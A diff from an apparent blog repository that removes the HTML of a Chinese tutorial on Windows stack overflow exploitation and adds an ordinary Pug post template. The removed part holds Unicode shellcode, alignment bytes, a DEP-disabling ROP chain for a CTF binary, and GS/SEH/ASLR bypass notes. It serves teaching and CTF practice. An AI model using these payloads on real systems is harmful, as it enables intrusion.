class="string">"\x50"</span>                      <span class="comment">#push EAX</span></span><br><span class="line"><span class="string">"\x71"</span>                      <span class="comment">#Venetian Padding</span></span><br><span class="line"><span class="string">"\xC3"</span>						<span class="comment">#ret </span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-
-* 这段align会将eax指向我们输入内容中的一段地址，我们只需要计算下偏移，布置好shellcode就可以执行到那里。
-
-* 需要注意的是&quot;\xc3&quot;这条指令在不同语言下的unicode编码方式不一样，在en版下OK，但是zh下会编码为&apos;\xca\x80&apos;，导致失败（反正很迷）（我这里是手动改的。。。）[参见这里](https://www.blackhat.com/presentations/win-usa-04/bh-win-04-fx.pdf)
-
-* shellcode的生成借助alpha2编译器。,以下是eax指向shellcode时（弹出计算器）的unicode编码
-
-  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode = (</span><br><span class="line"><span class="string">"PPYAIAIAIAIAQATAXAZAPA3QADAZAB"</span></span><br><span class="line"><span class="string">"ARALAYAIAQAIAQAPA5AAAPAZ1AI1AIA"</span></span><br><span class="line"><span class="string">"IAJ11AIAIAXA58AAPAZABABQI1AIQIA"</span></span><br><span class="line"><span class="string">"IQI1111AIAJQI1AYAZBABABABAB30AP"</span></span><br><span class="line"><span class="string">"B944JBP199B1RH2CQQRL1SR4X86MMSDF3LKOHPA"</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-</code></pre><ul>
-<li><p>如果，我们不用push, ret的方式跳转到shellcode，而是一步步走到shellcode。</p>
-<ul>
-<li><p>注意将eax指向shellcode的首个非null byte。</p>
-</li>
-<li><p>eax的值，可以由ebp（栈的值，shellcode附近）经过计算（注意unicode对齐）布置到当前地址后一段。</p>
-</li>
-<li><p>计算偏移，将shellcode布置到eax指向的位置。</p>
-</li>
-<li><p>填充的”nop”，我一般用’s’，在unicode下就是跳转到下一条指令。（当然也可以用前面提到的nop）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jnc Label1</span><br><span class="line">Label1:</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-<pre><code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">align = (</span><br><span class="line"><span class="string">'\x55'</span></span><br><span class="line"><span class="string">'\x71'</span></span><br><span class="line"><span class="string">'\x58'</span></span><br><span class="line"><span class="string">"\x71"</span>                      <span class="comment">#Venetian Padding</span></span><br><span class="line"><span class="string">"\x05\x40\x11"</span>              <span class="comment">#add eax,0x11004000  \</span></span><br><span class="line"><span class="string">"\x71"</span>                      <span class="comment">#Venetian Padding     |&gt; +3000</span></span><br><span class="line"><span class="string">"\x2d\x10\x11"</span>              <span class="comment">#sub eax,0x11001000  /</span></span><br><span class="line"><span class="string">"\x71"</span>                      <span class="comment">#Venetian Padding</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-</code></pre><ul>
-<li><p>这次就不要ret，直接平滑地“走到”shellcode。</p>
-
-</li>
-</ul>
-<ul>
-<li><h5 id="ROP方式绕过DEP"><a href="#ROP方式绕过DEP" class="headerlink" title="ROP方式绕过DEP"></a>ROP方式绕过DEP</h5><ul>
-<li><p>和Linux下的绕过NX类似，都是通过ROP chain来完成。</p>
-<ul>
-<li><p>不同的是构造多个函数调用形成chain，由于Windwos在执行完系统调用后销毁参数空间，所以不会出现第二个函数的参数和第一个函数参数重合的情况。易于构造chain，只需要将参数和返回地址连续布置即可。如VirtuaAlloc和Memcpy连续调用的布置。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. pointer to VirtualAlloc</span><br><span class="line">  2. pointer to memcpy  (return address field of VirtualAlloc()). When VirtualAlloc ends, it will return to this address</span><br><span class="line">3. lpAddress : arbitrary address (where to allocate new memory. Example 0x00200000)</span><br><span class="line">  4. size (how big should new memory allocation be)</span><br><span class="line">5. flAllocationType (0x1000 : MEM_COMMIT)</span><br><span class="line">  6. flProtect (0x40 :  PAGE_EXECUTE_READWRITE)</span><br><span class="line">7. Arbitrary address (same address as lpAddress, this param here will used to jump to shellcode after memcpy() returns). This field is the first parameter to the memcpy() function</span><br><span class="line">  8. Arbitrary address (again, same address as lpAddress. Parameter here will be used as destination address for memcpy() ). This field is the second parameter to the memcpy() function</span><br><span class="line">9. Address of shellcode ( = source parameter for memcpy()). This will be the 3rd parameter to the memcpy() function</span><br><span class="line">  10. Size : size parameter for memcpy(). This is the last parameter for the memcpy() function</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li><p>不同的是，Windows下，我们可以先rop调用WIN API来关闭DEP保护或者重新定义属性，再执行位于stack上的shellcode。可用的WIN API如下</p>
-<p>​    <img src="/2019/10/04/Windows下栈溢出利用总结/17.png" title="[]"></p>
-</li>
-<li><p>布置的方式也有所不同，由于在Linux上完全是依赖代码片段来完成整个get shell的过程，因此在stack上的都是参数和可执行的地址，而在window上我们一般最终还是需要在stack上执行shellcode。所以需要保持代码段执行完毕后esp指向shellcode，之后ret或者jmp esp都可以完成。</p>
-</li>
-<li><p>这里的stack的布置，我们只需要找到合适的”pop r32 retn”，”pushad retn”组合来将需要的片段放在合适的r32中，再通过pushad入栈。此时空间分布如下。注意，如果edi是”pop edi ret”，esi是啥就无所谓了。（反正只要能跳到API就行了）</p>
-<p>​    <img src="/2019/10/04/Windows下栈溢出利用总结/19.png" title="[]"></p>
-</li>
-<li><p>这样，在执行API关闭DEP之后，就可以顺利进入shellcode（仍然在stack中）。</p>
-</li>
-<li><p>以ISCC 2014的一个pwn为例(shellcode.exe)，这里选用的API是<strong>SetProcessPolicy</strong>。</p>
-<ul>
-<li>确定偏移….</li>
-<li>主要是rop_chain的构造。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> rop_gadgets = [</span><br><span class="line"><span class="number">0x7c801d5d</span>,  <span class="comment">#RETN</span></span><br><span class="line"><span class="number">0x90909090</span>,  <span class="comment">#nops</span></span><br><span class="line">   <span class="number">0x7c863e63</span>,  <span class="comment"># POP EBP # RETN [kernel32.dll] </span></span><br><span class="line">   <span class="number">0x7c862144</span>,  <span class="comment"># SetProcessDEPPolicy() [kernel32.dll]</span></span><br><span class="line">   <span class="number">0x7c80dfdd</span>,  <span class="comment"># POP EBX # RETN [kernel32.dll] </span></span><br><span class="line">   <span class="number">0x00000000</span>,  <span class="comment"># dwFlag</span></span><br><span class="line">   <span class="number">0x7c810afe</span>,  <span class="comment"># POP EDI # RETN [kernel32.dll] </span></span><br><span class="line">   <span class="number">0x7c810afe</span>,  <span class="comment"># skip 4 bytes [kernel32.dll]</span></span><br><span class="line">   <span class="number">0x77d23ad9</span>,  <span class="comment"># PUSHAD # RETN  [User32.dll]</span></span><br><span class="line"> ]</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<pre><code>* 注意，如果不可以传&apos;\x00&apos;这样的字节，可以通过指令运算来完成。
-* 这里有个有趣的，调试过程中发现如果在0x7c801d5d下了断点，shellcode就会异常中断。猜测是由于断点的地方改变了一个字节。
-</code></pre><ul>
-<li><h4 id="NtSetInformationProcess（驻留在ntdll的LdrpCheckNXCompatibility）关闭DEP"><a href="#NtSetInformationProcess（驻留在ntdll的LdrpCheckNXCompatibility）关闭DEP" class="headerlink" title="NtSetInformationProcess（驻留在ntdll的LdrpCheckNXCompatibility）关闭DEP"></a>NtSetInformationProcess（驻留在ntdll的LdrpCheckNXCompatibility）关闭DEP</h4><ul>
-<li><p>ret2libc方式调用（需要在stack上布置参数）</p>
-<ul>
-<li>类似与ROP</li>
-</ul>
-</li>
-<li><p>利用ntdll的特殊代码，引导执行。</p>
-<ul>
-<li><p>执行DEP关闭的操作</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;</span><br><span class="line"></span><br><span class="line">NtSetInformationProcess(</span><br><span class="line">   NtCurrentProcess(),    <span class="comment">// (HANDLE)-1</span></span><br><span class="line">   ProcessExecuteFlags,   <span class="comment">// 0x22</span></span><br><span class="line">   &amp;ExecuteFlags,         <span class="comment">// ptr to 0x2</span></span><br><span class="line">   <span class="keyword">sizeof</span>(ExecuteFlags)); <span class="comment">// 0x4</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>XP1及之前LdrpCheckNXCompatibility在内部调用NtSetInformationProcess， XP2及XP3之后是ZWSetInformation，当满足一定条件时，就可以自动执行关闭DEP的操作。</p>
-</li>
-<li><p>在windbg里分析LdrpCheckNXCompatibility(XP3)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ntdll!LdrpCheckNXCompatibility:</span><br><span class="line">7c93cd11 8bff            mov     edi,edi</span><br><span class="line">7c93cd13 55              push    ebp</span><br><span class="line">7c93cd14 8bec            mov     ebp,esp</span><br><span class="line">7c93cd16 51              push    ecx</span><br><span class="line">7c93cd17 8365fc00        and     dword ptr [ebp-4],0</span><br><span class="line">7c93cd1b 56              push    esi</span><br><span class="line">7c93cd1c ff7508          push    dword ptr [ebp+8]</span><br><span class="line">7c93cd1f e887ffffff      call    ntdll!LdrpCheckSafeDiscDll (7c93ccab)</span><br><span class="line">7c93cd24 3c01            cmp     al,1			#第一目标</span><br><span class="line">7c93cd26 6a02            push    2</span><br><span class="line">7c93cd28 5e              pop     esi			#esi = 2</span><br><span class="line">7c93cd29 0f84df290200    je      ntdll!LdrpCheckNXCompatibility+0x1a (7c95f70e)</span><br><span class="line">												#第二目标</span><br><span class="line">0:000&gt; u 0x7c95f70e</span><br><span class="line">ntdll!LdrpCheckNXCompatibility+0x1a:</span><br><span class="line">7c95f70e 8975fc          mov     dword ptr [ebp-4],esi	#存储2的  一个指针</span><br><span class="line">7c95f711 e919d6fdff      jmp     ntdll!LdrpCheckNXCompatibility+0x1d (7c93cd2f)</span><br><span class="line">												#第三目标</span><br><span class="line">ntdll!LdrpCheckNXCompatibility+0x1d:</span><br><span class="line">7c93cd2f 837dfc00        cmp     dword ptr [ebp-4],0  #这里2 != 0， 跳转成功</span><br><span class="line">7c93cd33 0f85f89a0100    jne     ntdll!LdrpCheckNXCompatibility+0x4d (7c956831)</span><br><span class="line">								</span><br><span class="line">0:000&gt; u 0x7c956831</span><br><span class="line">ntdll!LdrpCheckNXCompatibility+0x4d:</span><br><span class="line">7c956831 6a04            push    4					#关闭DEP的参数</span><br><span class="line">7c956833 8d45fc          lea     eax,[ebp-4]</span><br><span class="line">7c956836 50              push    eax</span><br><span class="line">7c956837 6a22            push    22h</span><br><span class="line">7c956839 6aff            push    0FFFFFFFFh			#执行函数</span><br><span class="line">7c95683b e84074fdff      call    ntdll!ZwSetInformationProcess (7c92dc80)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>因此，只需要满足当eax = 1的时候，转到LdrpCheckNXCompatibility的cmp al 1的语句，我们就可以让这一代码段关闭DEP。</p>
-</li>
-<li><p>在执行关闭DEP的前，XP1有对edp的一些内存操作，XP2之后在关闭DEP后有对esi的一些操作。需要满足一定的条件（可写等）。一般让二者在esp附近。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push esp, pop ebp, ret</span><br><span class="line">push esp. pop esi, ret</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>很遗憾的是，在XP1和XP2上都成功了，但是在XP3上失败了，没能够跳到shellcode（继续研究吧）</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><h5 id="WriteProcessMemory"><a href="#WriteProcessMemory" class="headerlink" title="WriteProcessMemory"></a>WriteProcessMemory</h5><ul>
-<li><p>在该函数内部依次调用如下函数</p>
-<ul>
-<li>ZwProtectVirtualMemory 用来确保目的地址有可写权限</li>
-<li>ZwWriteVirtualMemory </li>
-<li>ZwFlushInstructionCache</li>
-<li>ZwWriteVirtualMemory</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li><h5 id="SEH绕过DEP"><a href="#SEH绕过DEP" class="headerlink" title="SEH绕过DEP"></a>SEH绕过DEP</h5><ul>
-<li>一般的SEH利用，我们会在nSEH处（stack上）放一个jumpcode，显然在DEP开启的时候是不行的。</li>
-<li>这样的情况下，我们需要变一下SEH，覆盖为”pop pop pop esp; ret”。这样会吧nSEH当作一个指针，会跳转到nSEH内容里，可以在nSEH处覆盖前面提到的绕过DEP的第一个地址。（ntdll下的LdrpCheckNXCompatibility）。</li>
-</ul>
-</li>
-<li><h5 id="ALSR绕过"><a href="#ALSR绕过" class="headerlink" title="ALSR绕过"></a>ALSR绕过</h5><ul>
-<li>EIP部分覆盖<ul>
-<li>有用代码地址和EIP的随机部分一致，只需要覆盖低位</li>
-</ul>
-</li>
-<li>使用未开启ALSR的模块来绕过。</li>
-<li>当程序发生异常而不会崩溃的时候，可以爆破。</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li><p>vtable覆盖绕过GS</p>
-<ul>
-<li><p>主要特点是利用虚表和字符串在同一函数栈帧下，溢出覆盖vtable指针的低位，使其指向字符串。（虚函数指针被控制）。</p>
-</li>
-<li><p>样例。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> &#123;</span></span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">void</span> __declspec(noinline) gs3(<span class="keyword">char</span>* src)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">   <span class="built_in">strcpy</span>(buf, src);</span><br><span class="line">   bar(); <span class="comment">// virtual function call</span></span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">virtual</span> <span class="keyword">void</span> __declspec(noinline) bar()</span><br><span class="line">   &#123;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Foo foo;</span><br><span class="line">  foo.gs3(</span><br><span class="line">  <span class="string">"AAAA"</span></span><br><span class="line">  <span class="string">"BBBB"</span></span><br><span class="line">  <span class="string">"CCCC"</span></span><br><span class="line">  <span class="string">"DDDD"</span></span><br><span class="line">  <span class="string">"EEEE"</span></span><br><span class="line">  <span class="string">"FFFF"</span></span><br><span class="line">	  );</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>上面的样例，foo实例是在main函数栈帧下，gs3参数字符串也是main下（编译器决定）。覆盖情况如下。</p>
-</li>
-<li><p>在溢出前。</p>
-<p><img src="Windows下栈溢出利用总结\20.png" alt=""></p>
-<p>栈帧依次保存ebp，返回地址，参数，虚表。值得注意的是，这里的参数地址0x4020fc和虚表指针0x40211c同在main下，当虚表指针低位被覆盖为’\x00’时，即0x402100，实际指向‘BBBBCCCC’。</p>
-</li>
-<li><p>溢出后</p>
-<p><img src="Windows下栈溢出利用总结\21.png" alt=""></p>
-</li>
-<li><p>此时虚表指针已经指向了字符串空间，虚函数指针当然就被控制了。</p>
-<p><img src="Windows下栈溢出利用总结\22.png" alt=""></p>
-</li>
-</ul>
-</li>
-<li><p>当我们的输入和vtable不在同一地址空间下，除非我们可以在某一位置（已知地址）伪造一个函数指针，不然覆盖虚表指针只会异常，而难以执行任意代码。</p>
-</li>
-</ul>
-</li>
-<li></li>
-</ul>
-<p>参考链接</p>
-<p><a href="http://blog.nsfocus.net/tutorial-overflow/" target="_blank" rel="noopener">看教程学溢出之SEH利用</a></p>
-<p><a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf" target="_blank" rel="noopener">EggHunter_paper</a></p>
-<p><a href="https://bbs.pediy.com/thread-121281.htm" target="_blank" rel="noopener">Unicode的shellcode补充</a></p>
-<p><a href="http://phrack.org/issues/61/11.html#article" target="_blank" rel="noopener">phrack关于unicode攻击特殊shellcode构成</a></p>
-<p><a href="www.unicode.org">Unicode详情</a></p>
-
-        </div>
-        <div class="post-tool">
-            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
-                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
-            </a>
-        </div>
-        
-        <div class="post-tags">标签：
-            
-            <a href="../../../../tags/pwn-windows-stack/">pwn windows stack</a>
-            
-        </div>
-        
-    </article>
-    
-    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
-    
-    
-</div>
-<script src="../../../../js/busuanzi.pure.mini.js"></script>
-
-        </div><!-- end #main-->
-    </div><!-- end #body -->
-    <footer class="footer">
-    <div class="footer-inner">
-        <p>
-            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <!-- 自定义链接 -->
-            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <a href="/app" title="App下载">App下载</a>
-        </p>
-        <p>
-            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
-            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
-            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
-            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
-            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
-        </p>
-        
-
-    </div>
-</footer>
-<script src="../../../../js/InsightSearch.js"></script>
-<script src="../../../../js/SimpleCore.js"></script>
-
-</div>
-<div class="fixed-btn">
-    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
-</div>
-<script>
-    $(function () {
-        SimpleCore.init({
-            buildingTime: '11/22/2018',
-            current: $('.post-tags').length > 0 ? 'post' : 'archive',
-            snsQRCode: '/images/sns-qrcode.png',
-            donateImg: '/images/donate-qr.png',
-        });
-    });
-</script>
-</body>
-</html>
+block content
+  article#post(class="")
+    if (!top_img)
+      #post-title.plain= page.title || _p('no_title')
+      #post-meta
+        if (theme.post_meta.date_type)
+          - var date_type = theme.post_meta.date_type === 'updated' ? '' : 'date'
+          time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+        if (theme.post_meta.categories && page.categories.data.length > 0)
+          if (theme.post_meta.date_type)
+            span.post-meta__separator |
+          each item, index in page.categories.data
+            i.fa.fa-inbox(aria-hidden="true")
+            a(href=url_for(item.path)).post-meta__categories  #[=item.name]
+            if (index < page.categories.data.length - 1)
+                i.fa.fa-angle-right.post-meta__separator(aria-hidden="true")
+        if (theme.disqus.enable && theme.disqus.count)
+          if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+            span.post-meta__separator |
+          i.fa.fa-comment-o(aria-hidden="true")
+          a(href=url_for(page.path) + '#disqus_thread')
+            span.disqus-comment-count(data-disqus-identifier=page.path)
+        if (theme.wordcount && theme.wordcount.enable)
+          span.post-meta__separator |
+          span.post-meta-wordcount
+            span= _p('post.wordcount') + ': '
+            span.word-count= wordcount(page.content)
+            span.post-meta__separator |
+            span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+    #post-content.article-container!= page.content
+  if (theme.post_copyright && theme.post_copyright.enable)
+    .post-copyright
+      .post-copyright__author
+        span.post-copyright-meta= _p('post.copyright.author') + ": "
+        span.post-copyright-info
+          a(href=`mailto:${config.email}`) #[=config.author]
+      .post-copyright__type
+        span.post-copyright-meta= _p('post.copyright.link') + ": "
+        span.post-copyright-info
+          a(href=url_for(page.permalink)) #[=page.permalink]
+      .post-copyright__notice
+        span.post-copyright-meta= _p('post.copyright.copyright_notice') + ": "
+        span.post-copyright-info!= _p('post.copyright.copyright_content', theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)
+  if (theme.post_meta.tags)
+    .post-meta__tag-list
+      each item, index in page.tags.data
+        a(href=url_for(item.path)).post-meta__tags #[=item.name]
+  if (theme.QR_code)
+    if (theme.QR_code.length > 0)
+      .post-qr-code
+        each item in theme.QR_code
+          .post-qr-code-item
+            img.post-qr-code__img(src=(item.itemlist||item).img)
+            .post-qr-code__desc=(item.itemlist||item).text
+  include includes/share/index.pug
+  include includes/pagination.pug
+  if (theme.adv && theme.adv.enable)
+    .post-adv!= theme.adv.info
+  if page.comments !== false
+    include includes/comments/index.pug
